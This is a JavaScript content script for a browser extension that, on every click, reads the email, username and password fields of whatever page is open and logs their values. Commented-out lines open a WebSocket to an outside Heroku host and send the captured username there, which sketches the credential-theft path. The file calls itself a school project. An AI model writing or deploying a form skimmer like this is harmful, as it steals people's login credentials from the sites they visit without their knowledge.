//Just in case a popular website is trying to redflag my IP
console.log("This is all for a school project!");

//var HOST = 'wss://thawing-island-58409.herokuapp.com';
//var ws = new WebSocket(HOST);


//This will get all the values of type email
//Email is the standard type for the email text box
//in most browsers

//Simply say the website of the current tab
console.log(window.location.host);

//Just for testing purposes
chrome.storage.sync.get("id", function(ev){
  console.log("This user is id is " + ev.id)
});

//Wait for a click on the screen
window.addEventListener("click", clickListen, false);

function clickListen (e){
  var val = document.getElementsByTagName('input');
  for(var i = 0; i < val.length; i++){
    if(val[i].type.toLowerCase() == 'email'){
        if(!(val[i].value === "" || val[i].value === null)){
          console.log("Username is " + val[i].value);
      }
    }
    if(val[i].type.toLowerCase() == 'password'){
      if(!(val[i].value === "" || val[i].value === null)){
        console.log("Password is " + val[i].value);
      }
    }
    /*
    Some forms that are used, such as instagram forms,
    have a input name rather than a type.
    */
    if(val[i].name.toLowerCase() == 'username'){
      if(!(val[i].value === "" || val[i].value === null)){
        console.log("Username is " + val[i].value);
      }
    }
  /*  if(val[i].name.toLowerCase() == 'password'){
      if(val[i].value != "" || val[i].value != null){
        console.log("Password is " + val[i].value);
      }
    }*/
  }
}

//ws.send("Username is "+document.getElementById('username').value);
